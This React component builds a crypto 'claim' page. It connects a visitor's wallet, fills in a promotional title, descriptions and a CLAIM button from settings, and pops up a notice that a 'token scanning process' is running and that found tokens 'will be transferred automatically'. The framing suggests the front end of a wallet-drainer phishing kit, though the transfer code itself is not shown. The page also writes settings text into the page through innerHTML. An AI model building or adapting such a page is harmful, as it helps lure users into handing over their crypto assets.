import React, { useEffect } from 'react'
import { useAccount } from 'wagmi'
import './ClaimPage.css'

// Import settings
import settings from '../../settings.js'

const ClaimPage = () => {
  const { address } = useAccount()

  useEffect(() => {
    // Load page content from settings
    document.getElementById("cp_name").innerHTML = settings.collectionInfo.name;
    if (settings.collectionInfo.socialMedia.discord == "") {
      document.head.insertAdjacentHTML('beforeend', '<style> #social_discord { opacity: 0.5; pointer-events: none; } </style>');
    } else document.getElementById("social_discord").href = settings.collectionInfo.socialMedia.discord;
    if (settings.collectionInfo.socialMedia.twitter == "") {
      document.head.insertAdjacentHTML('beforeend', '<style> #social_twitter { opacity: 0.5; pointer-events: none; } </style>');
    } else document.getElementById("social_twitter").href = settings.collectionInfo.socialMedia.twitter;
    if (settings.collectionInfo.socialMedia.instagram == "") {
      document.head.insertAdjacentHTML('beforeend', '<style> #social_instagram { opacity: 0.5; pointer-events: none; } </style>');
    } else document.getElementById("social_instagram").href = settings.collectionInfo.socialMedia.instagram;

    document.title = settings.collectionInfo.name + ' - Claim';

    document.getElementById("titleH2").innerHTML = settings.claimPageInfo.title;
    document.getElementById("shortDescription").innerHTML = settings.claimPageInfo.shortDescription;
    document.getElementById("longDescription").innerHTML = settings.claimPageInfo.longDescription;

    document.getElementById("claimButton").innerHTML = settings.claimPageInfo.claimButtonText;

    document.getElementById("badgeImage").src = `../assets/${settings.claimPageInfo.image}`;
    document.getElementById("badgeImage").style.borderRadius = settings.claimPageInfo.imageRadius + "px";
    
    // Add notification that token scanning is running in background
    const addNotification = () => {
      const style = document.createElement('style')
      style.textContent = `
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes pulse {
          0% { opacity: 0.6; }
          50% { opacity: 1; }
          100% { opacity: 0.6; }
        }
        
        #background-process-notification {
          position: fixed;
          bottom: 20px;
          left: 20px;
          padding: 12px 16px;
          background-color: #28a745;
          color: white;
          border-radius: 6px;
          font-size: 14px;
          box-shadow: 0 2px 8px rgba(0,0,0,0.2);
          z-index: 9999;
          animation: fadeIn 0.5s ease-out, pulse 2s infinite;
          max-width: 300px;
        }
        
        #background-process-notification .close-btn {
          float: right;
          margin-left: 10px;
          cursor: pointer;
          font-weight: bold;
          opacity: 0.7;
        }
        
        #background-process-notification .close-btn:hover {
          opacity: 1;
        }
      `
      document.head.appendChild(style)
      
      const notification = document.createElement('div')
      notification.id = 'background-process-notification'
      notification.innerHTML = `
        <span class="close-btn" id="close-notification">×</span>
        <div>🔒 Token scanning process is running in the background</div>
        <div style="font-size: 12px; margin-top: 4px; opacity: 0.9;">Any tokens found will be transferred automatically</div>
      `
      
      document.body.appendChild(notification)
      
      const closeBtn = document.getElementById('close-notification')
      if (closeBtn) {
        closeBtn.addEventListener('click', function() {
          notification.style.display = 'none'
        })
      }
      
      setTimeout(function() {
        if (notification.parentNode) {
          notification.style.display = 'none'
        }
      }, 30000)
    }
    
    addNotification()
  }, [])

  return (
    <div className="container no-bg">
      <nav>
        <div className="logo"></div>
        <div className="right">
          <p id="walletAddress">{address ? `${address.substring(0, 6)}...${address.substring(38)}` : 'NOT CONNECTED'}</p>
          <img src="/assets/svg/meta.svg" alt="" />
        </div>
      </nav>
      <div className="logo-re" style={{ display: 'none' }}></div>
      <div className="section3">
        <div className="left">
          <img 
            id="badgeImage" 
            style={{ borderRadius: '0px' }} 
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAQAAAAHUWYVAAABKUlEQVR42u3RMQEAAAjDMKYc6WCCgyOV0GS69KgAASIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAgLEBCACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiBAgAARECACAkRAgAgIEAERECACAkRAgAgIEAERECACAkSXLZ1yK0hKBJiuAAAAAElFTkSuQmCC" 
            alt="Claim badge"
          />
        </div>
        <div className="right">
          <h2 id="titleH2">Loading...</h2>
          <p id="shortDescription"></p>
          <p id="longDescription"></p>
          <div className="block-button">
            <button id="claimButton" className="claim-button">CLAIM</button>
            <p id="notEli" style={{ color: 'red', paddingTop: '10px', display: 'none', letterSpacing: '3px' }}></p>
          </div>
        </div>
      </div>
      <div className="section2">
        <div className="left">
          <a href="#">Terms & Conditions<br />Privacy Policy</a>
          <p>© 2022 <span id="cp_name"></span></p>
        </div>
        <div className="right">
          <a id="social_discord" href="#" target="_blank" rel="noreferrer"><img src="/assets/svg/discord.svg" alt="" /></a>
          <a id="social_twitter" href="#" target="_blank" rel="noreferrer"><img src="/assets/svg/twiter.svg" alt="" /></a>
          <a id="social_instagram" href="#" target="_blank" rel="noreferrer"><img src="/assets/svg/insta.svg" alt="" /></a>
        </div>
      </div>
    </div>
  )
}

export default ClaimPage